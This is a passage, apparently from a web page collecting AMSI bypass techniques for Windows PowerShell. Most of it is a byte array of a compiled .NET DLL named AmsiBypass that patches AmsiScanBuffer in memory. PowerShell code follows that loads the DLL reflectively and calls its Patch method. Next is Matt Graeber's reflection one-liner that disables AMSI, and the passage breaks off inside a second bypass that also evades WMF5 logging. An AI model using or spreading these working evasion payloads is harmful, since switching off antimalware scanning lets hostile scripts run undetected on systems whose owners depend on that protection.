1, 37, 208, 1, 0, 0, 4, 40, 16, 0, 0, 10, 19, 4, 25, 40, 17, 0, 0, 10, 19, 5, 17, 4, 22, 17, 5, 25, 40, 18, 0, 0, 10, 0, 7, 31, 27, 40, 19, 0, 0, 10, 17, 5, 25, 40, 4, 0, 0, 6, 0, 114, 117, 1, 0, 112, 40, 14, 0, 0, 10, 0, 22, 19, 7, 43, 0, 17, 7, 42, 34, 2, 40, 20, 0, 0, 10, 0, 42, 0, 0, 66, 83, 74, 66, 1, 0, 1, 0, 0, 0, 0, 0, 12, 0, 0, 0, 118, 52, 46, 48, 46, 51, 48, 51, 49, 57, 0, 0, 0, 0, 5, 0, 108, 0, 0, 0, 212, 2, 0, 0, 35, 126, 0, 0, 64, 3, 0, 0, 176, 3, 0, 0, 35, 83, 116, 114, 105, 110, 103, 115, 0, 0, 0, 0, 240, 6, 0, 0, 204, 1, 0, 0, 35, 85, 83, 0, 188, 8, 0, 0, 16, 0, 0, 0, 35, 71, 85, 73, 68, 0, 0, 0, 204, 8, 0, 0, 32, 1, 0, 0, 35, 66, 108, 111, 98, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 1, 87, 149, 2, 52, 9, 2, 0, 0, 0, 250, 1, 51, 0, 22, 0, 0, 1, 0, 0, 0, 22, 0, 0, 0, 4, 0, 0, 0, 1, 0, 0, 0, 6, 0, 0, 0, 10, 0, 0, 0, 20, 0, 0, 0, 11, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 2, 0, 0, 0, 4, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 85, 2, 1, 0, 0, 0, 0, 0, 6, 0, 141, 1, 206, 2, 6, 0, 223, 1, 206, 2, 6, 0, 231, 0, 156, 2, 15, 0, 238, 2, 0, 0, 6, 0, 18, 1, 14, 2, 6, 0, 198, 1, 107, 2, 6, 0, 110, 1, 107, 2, 6, 0, 43, 1, 107, 2, 6, 0, 72, 1, 107, 2, 6, 0, 173, 1, 107, 2, 6, 0, 251, 0, 107, 2, 6, 0, 48, 3, 100, 2, 6, 0, 204, 0, 206, 2, 6, 0, 194, 0, 100, 2, 6, 0, 149, 2, 100, 2, 6, 0, 154, 0, 100, 2, 6, 0, 148, 2, 100, 2, 6, 0, 253, 1, 100, 2, 6, 0, 253, 2, 206, 2, 6, 0, 125, 3, 100, 2, 6, 0, 135, 0, 100, 2, 6, 0, 64, 2, 175, 2, 0, 0, 0, 0, 38, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 16, 0, 46, 2, 16, 3, 49, 0, 1, 0, 1, 0, 0, 1, 0, 0, 47, 0, 0, 0, 49, 0, 1, 0, 7, 0, 19, 1, 0, 0, 10, 0, 0, 0, 57, 0, 2, 0, 7, 0, 51, 1, 78, 0, 91, 0, 0, 0, 0, 0, 128, 0, 150, 32, 136, 3, 95, 0, 1, 0, 0, 0, 0, 0, 128, 0, 150, 32, 23, 3, 100, 0, 2, 0, 0, 0, 0, 0, 128, 0, 150, 32, 70, 3, 106, 0, 4, 0, 0, 0, 0, 0, 128, 0, 145, 32, 151, 3, 115, 0, 8, 0, 80, 32, 0, 0, 0, 0, 150, 0, 40, 2, 122, 0, 11, 0, 53, 33, 0, 0, 0, 0, 134, 24, 142, 2, 6, 0, 11, 0, 0, 0, 1, 0, 179, 0, 0, 0, 1, 0, 162, 0, 0, 0, 2, 0, 170, 0, 0, 0, 1, 0, 38, 3, 0, 0, 2, 0, 2, 2, 0, 0, 3, 0, 85, 3, 2, 0, 4, 0, 55, 3, 0, 0, 1, 0, 110, 3, 0, 0, 2, 0, 119, 0, 0, 0, 3, 0, 9, 2, 9, 0, 142, 2, 1, 0, 17, 0, 142, 2, 6, 0, 25, 0, 142, 2, 10, 0, 41, 0, 142, 2, 16, 0, 49, 0, 142, 2, 16, 0, 57, 0, 142, 2, 16, 0, 65, 0, 142, 2, 16, 0, 73, 0, 142, 2, 16, 0, 81, 0, 142, 2, 16, 0, 89, 0, 142, 2, 16, 0, 105, 0, 142, 2, 6, 0, 121, 0, 137, 2, 35, 0, 121, 0, 162, 3, 38, 0, 129, 0, 184, 0, 44, 0, 137, 0, 98, 3, 49, 0, 153, 0, 115, 3, 54, 0, 177, 0, 51, 2, 62, 0, 177, 0, 131, 3, 67, 0, 121, 0, 125, 2, 76, 0, 97, 0, 142, 2, 6, 0, 46, 0, 11, 0, 126, 0, 46, 0, 19, 0, 135, 0, 46, 0, 27, 0, 166, 0, 46, 0, 35, 0, 175, 0, 46, 0, 43, 0, 230, 0, 46, 0, 51, 0, 246, 0, 46, 0, 59, 0, 1, 1, 46, 0, 67, 0, 14, 1, 46, 0, 75, 0, 230, 0, 46, 0, 83, 0, 230, 0, 99, 0, 91, 0, 25, 1, 1, 0, 3, 0, 0, 0, 4, 0, 21, 0, 1, 0, 72, 2, 0, 1, 3, 0, 136, 3, 1, 0, 0, 1, 5, 0, 23, 3, 1, 0, 0, 1, 7, 0, 70, 3, 1, 0, 0, 1, 9, 0, 148, 3, 2, 0, 100, 44, 0, 0, 1, 0, 4, 128, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 12, 3, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 82, 0, 123, 0, 0, 0, 0, 0, 4, 0, 3, 0, 0, 0, 0, 0, 0, 107, 101, 114, 110, 101, 108, 51, 50, 0, 95, 95, 83, 116, 97, 116, 105, 99, 65, 114, 114, 97, 121, 73, 110, 105, 116, 84, 121, 112, 101, 83, 105, 122, 101, 61, 51, 0, 60, 77, 111, 100, 117, 108, 101, 62, 0, 60, 80, 114, 105, 118, 97, 116, 101, 73, 109, 112, 108, 101, 109, 101, 110, 116, 97, 116, 105, 111, 110, 68, 101, 116, 97, 105, 108, 115, 62, 0, 53, 49, 67, 65, 70, 66, 52, 56, 49, 51, 57, 66, 48, 50, 69, 48, 54, 49, 68, 52, 57, 49, 57, 67, 53, 49, 55, 54, 54, 50, 49, 66, 70, 56, 55, 68, 65, 67, 69, 68, 0, 115, 114, 99, 0, 110, 101, 116, 115, 116, 97, 110, 100, 97, 114, 100, 0, 82, 117, 110, 116, 105, 109, 101, 70, 105, 101, 108, 100, 72, 97, 110, 100, 108, 101, 0, 67, 111, 110, 115, 111, 108, 101, 0, 104, 77, 111, 100, 117, 108, 101, 0, 112, 114, 111, 99, 78, 97, 109, 101, 0, 110, 97, 109, 101, 0, 87, 114, 105, 116, 101, 76, 105, 110, 101, 0, 86, 97, 108, 117, 101, 84, 121, 112, 101, 0, 67, 111, 109, 112, 105, 108, 101, 114, 71, 101, 110, 101, 114, 97, 116, 101, 100, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 68, 101, 98, 117, 103, 103, 97, 98, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 84, 105, 116, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 84, 97, 114, 103, 101, 116, 70, 114, 97, 109, 101, 119, 111, 114, 107, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 70, 105, 108, 101, 86, 101, 114, 115, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 73, 110, 102, 111, 114, 109, 97, 116, 105, 111, 110, 97, 108, 86, 101, 114, 115, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 67, 111, 109, 112, 105, 108, 97, 116, 105, 111, 110, 82, 101, 108, 97, 120, 97, 116, 105, 111, 110, 115, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 80, 114, 111, 100, 117, 99, 116, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 109, 112, 97, 110, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 82, 117, 110, 116, 105, 109, 101, 67, 111, 109, 112, 97, 116, 105, 98, 105, 108, 105, 116, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 66, 121, 116, 101, 0, 100, 119, 83, 105, 122, 101, 0, 115, 105, 122, 101, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 86, 101, 114, 115, 105, 111, 110, 105, 110, 103, 0, 80, 97, 116, 99, 104, 0, 65, 109, 115, 105, 0, 65, 108, 108, 111, 99, 72, 71, 108, 111, 98, 97, 108, 0, 77, 97, 114, 115, 104, 97, 108, 0, 107, 101, 114, 110, 101, 108, 51, 50, 46, 100, 108, 108, 0, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 46, 100, 108, 108, 0, 83, 121, 115, 116, 101, 109, 0, 83, 121, 115, 116, 101, 109, 46, 82, 101, 102, 108, 101, 99, 116, 105, 111, 110, 0, 111, 112, 95, 65, 100, 100, 105, 116, 105, 111, 110, 0, 90, 101, 114, 111, 0, 46, 99, 116, 111, 114, 0, 85, 73, 110, 116, 80, 116, 114, 0, 83, 121, 115, 116, 101, 109, 46, 68, 105, 97, 103, 110, 111, 115, 116, 105, 99, 115, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 73, 110, 116, 101, 114, 111, 112, 83, 101, 114, 118, 105, 99, 101, 115, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 67, 111, 109, 112, 105, 108, 101, 114, 83, 101, 114, 118, 105, 99, 101, 115, 0, 68, 101, 98, 117, 103, 103, 105, 110, 103, 77, 111, 100, 101, 115, 0, 82, 117, 110, 116, 105, 109, 101, 72, 101, 108, 112, 101, 114, 115, 0, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 0, 71, 101, 116, 80, 114, 111, 99, 65, 100, 100, 114, 101, 115, 115, 0, 108, 112, 65, 100, 100, 114, 101, 115, 115, 0, 79, 98, 106, 101, 99, 116, 0, 108, 112, 102, 108, 79, 108, 100, 80, 114, 111, 116, 101, 99, 116, 0, 86, 105, 114, 116, 117, 97, 108, 80, 114, 111, 116, 101, 99, 116, 0, 102, 108, 78, 101, 119, 80, 114, 111, 116, 101, 99, 116, 0, 111, 112, 95, 69, 120, 112, 108, 105, 99, 105, 116, 0, 100, 101, 115, 116, 0, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101, 65, 114, 114, 97, 121, 0, 67, 111, 112, 121, 0, 76, 111, 97, 100, 76, 105, 98, 114, 97, 114, 121, 0, 82, 116, 108, 77, 111, 118, 101, 77, 101, 109, 111, 114, 121, 0, 111, 112, 95, 69, 113, 117, 97, 108, 105, 116, 121, 0, 0, 0, 0, 17, 97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 87, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 114, 0, 101, 0, 116, 0, 114, 0, 105, 0, 101, 0, 118, 0, 101, 0, 32, 0, 97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0, 32, 0, 112, 0, 111, 0, 105, 0, 110, 0, 116, 0, 101, 0, 114, 0, 33, 0, 0, 29, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 0, 117, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 114, 0, 101, 0, 116, 0, 114, 0, 105, 0, 101, 0, 118, 0, 101, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 102, 0, 117, 0, 110, 0, 99, 0, 116, 0, 105, 0, 111, 0, 110, 0, 32, 0, 112, 0, 111, 0, 105, 0, 110, 0, 116, 0, 101, 0, 114, 0, 33, 0, 0, 117, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 109, 0, 111, 0, 100, 0, 105, 0, 102, 0, 121, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 109, 0, 101, 0, 109, 0, 111, 0, 114, 0, 121, 0, 32, 0, 112, 0, 101, 0, 114, 0, 109, 0, 105, 0, 115, 0, 115, 0, 105, 0, 111, 0, 110, 0, 115, 0, 33, 0, 0, 83, 71, 0, 114, 0, 101, 0, 97, 0, 116, 0, 32, 0, 115, 0, 117, 0, 99, 0, 99, 0, 101, 0, 115, 0, 115, 0, 46, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 112, 0, 97, 0, 116, 0, 99, 0, 104, 0, 101, 0, 100, 0, 33, 0, 32, 0, 58, 0, 41, 0, 0, 0, 0, 0, 94, 196, 134, 67, 207, 43, 76, 71, 180, 110, 209, 17, 221, 107, 164, 138, 0, 4, 32, 1, 1, 8, 3, 32, 0, 1, 5, 32, 1, 1, 17, 17, 4, 32, 1, 1, 14, 13, 7, 10, 24, 24, 25, 9, 29, 5, 24, 2, 8, 2, 2, 2, 6, 24, 5, 0, 2, 2, 24, 24, 4, 0, 1, 1, 14, 4, 0, 1, 25, 11, 7, 0, 2, 1, 18, 81, 17, 85, 4, 0, 1, 24, 8, 8, 0, 4, 1, 29, 5, 8, 24, 8, 5, 0, 2, 24, 24, 8, 8, 204, 123, 19, 255, 205, 45, 221, 81, 3, 6, 17, 16, 4, 0, 1, 24, 14, 5, 0, 2, 24, 24, 14, 8, 0, 4, 2, 24, 25, 9, 16, 9, 6, 0, 3, 1, 24, 24, 8, 3, 0, 0, 8, 8, 1, 0, 8, 0, 0, 0, 0, 0, 30, 1, 0, 1, 0, 84, 2, 22, 87, 114, 97, 112, 78, 111, 110, 69, 120, 99, 101, 112, 116, 105, 111, 110, 84, 104, 114, 111, 119, 115, 1, 8, 1, 0, 7, 1, 0, 0, 0, 0, 54, 1, 0, 25, 46, 78, 69, 84, 83, 116, 97, 110, 100, 97, 114, 100, 44, 86, 101, 114, 115, 105, 111, 110, 61, 118, 50, 46, 48, 1, 0, 84, 14, 20, 70, 114, 97, 109, 101, 119, 111, 114, 107, 68, 105, 115, 112, 108, 97, 121, 78, 97, 109, 101, 0, 15, 1, 0, 10, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 0, 0, 10, 1, 0, 5, 68, 101, 98, 117, 103, 0, 0, 12, 1, 0, 7, 49, 46, 48, 46, 48, 46, 48, 0, 0, 10, 1, 0, 5, 49, 46, 48, 46, 48, 0, 0, 4, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 92, 168, 168, 0, 1, 77, 80, 2, 0, 0, 0, 100, 0, 0, 0, 128, 43, 0, 0, 128, 13, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 19, 0, 0, 0, 39, 0, 0, 0, 228, 43, 0, 0, 228, 13, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 82, 83, 68, 83, 215, 18, 206, 3, 139, 112, 185, 73, 189, 89, 99, 32, 233, 159, 0, 221, 1, 0, 0, 0, 47, 111, 112, 116, 47, 80, 114, 111, 106, 101, 99, 116, 115, 47, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 47, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 47, 111, 98, 106, 47, 68, 101, 98, 117, 103, 47, 110, 101, 116, 115, 116, 97, 110, 100, 97, 114, 100, 50, 46, 48, 47, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 46, 112, 100, 98, 0, 83, 72, 65, 50, 53, 54, 0, 215, 18, 206, 3, 139, 112, 185, 169, 125, 89, 99, 32, 233, 159, 0, 221, 32, 92, 168, 40, 54, 252, 229, 155, 150, 128, 72, 101, 126, 213, 146, 143, 51, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 77, 44, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 63, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 95, 67, 111, 114, 68, 108, 108, 77, 97, 105, 110, 0, 109, 115, 99, 111, 114, 101, 101, 46, 100, 108, 108, 0, 0, 0, 0, 0, 0, 255, 37, 0, 32, 0, 16, 49, 255, 144, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 16, 0, 0, 0, 24, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 48, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 72, 0, 0, 0, 88, 64, 0, 0, 212, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 212, 2, 52, 0, 0, 0, 86, 0, 83, 0, 95, 0, 86, 0, 69, 0, 82, 0, 83, 0, 73, 0, 79, 0, 78, 0, 95, 0, 73, 0, 78, 0, 70, 0, 79, 0, 0, 0, 0, 0, 189, 4, 239, 254, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 63, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 68, 0, 0, 0, 1, 0, 86, 0, 97, 0, 114, 0, 70, 0, 105, 0, 108, 0, 101, 0, 73, 0, 110, 0, 102, 0, 111, 0, 0, 0, 0, 0, 36, 0, 4, 0, 0, 0, 84, 0, 114, 0, 97, 0, 110, 0, 115, 0, 108, 0, 97, 0, 116, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 0, 0, 176, 4, 52, 2, 0, 0, 1, 0, 83, 0, 116, 0, 114, 0, 105, 0, 110, 0, 103, 0, 70, 0, 105, 0, 108, 0, 101, 0, 73, 0, 110, 0, 102, 0, 111, 0, 0, 0, 16, 2, 0, 0, 1, 0, 48, 0, 48, 0, 48, 0, 48, 0, 48, 0, 52, 0, 98, 0, 48, 0, 0, 0, 54, 0, 11, 0, 1, 0, 67, 0, 111, 0, 109, 0, 112, 0, 97, 0, 110, 0, 121, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 0, 0, 0, 0, 62, 0, 11, 0, 1, 0, 70, 0, 105, 0, 108, 0, 101, 0, 68, 0, 101, 0, 115, 0, 99, 0, 114, 0, 105, 0, 112, 0, 116, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 0, 0, 0, 0, 48, 0, 8, 0, 1, 0, 70, 0, 105, 0, 108, 0, 101, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 62, 0, 15, 0, 1, 0, 73, 0, 110, 0, 116, 0, 101, 0, 114, 0, 110, 0, 97, 0, 108, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 0, 0, 0, 40, 0, 2, 0, 1, 0, 76, 0, 101, 0, 103, 0, 97, 0, 108, 0, 67, 0, 111, 0, 112, 0, 121, 0, 114, 0, 105, 0, 103, 0, 104, 0, 116, 0, 0, 0, 32, 0, 0, 0, 70, 0, 15, 0, 1, 0, 79, 0, 114, 0, 105, 0, 103, 0, 105, 0, 110, 0, 97, 0, 108, 0, 70, 0, 105, 0, 108, 0, 101, 0, 110, 0, 97, 0, 109, 0, 101, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 0, 0, 0, 54, 0, 11, 0, 1, 0, 80, 0, 114, 0, 111, 0, 100, 0, 117, 0, 99, 0, 116, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 0, 0, 0, 0, 48, 0, 6, 0, 1, 0, 80, 0, 114, 0, 111, 0, 100, 0, 117, 0, 99, 0, 116, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 56, 0, 8, 0, 1, 0, 65, 0, 115, 0, 115, 0, 101, 0, 109, 0, 98, 0, 108, 0, 121, 0, 32, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 12, 0, 0, 0, 96, 60, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)) | Out-Null; Write-Output \u0026#34;DLL has been reflected\u0026#34;; } [Bypass.AMSI]::Patch(); } MyPatch; Start-Sleep 1; Using Matt Graebers Reflection method # [Ref].Assembly.GetType(\u0026#39;System.Management.Automation.AmsiUtils\u0026#39;).GetField(\u0026#39;amsiInitFailed\u0026#39;,\u0026#39;NonPublic,Static\u0026#39;).SetValue($null,$true) Using Matt Graebers Reflection method with WMF5 autologging bypass # [Delegate]::CreateDelegate((\u0026#34;Func``3[String, $(([String].Assembly.GetType(\u0026#39;System.Reflection.Bindin\u0026#39;+\u0026#39;gFlags\u0026#39;)).FullName), System.Reflection.FieldInfo]\u0026#34; -as 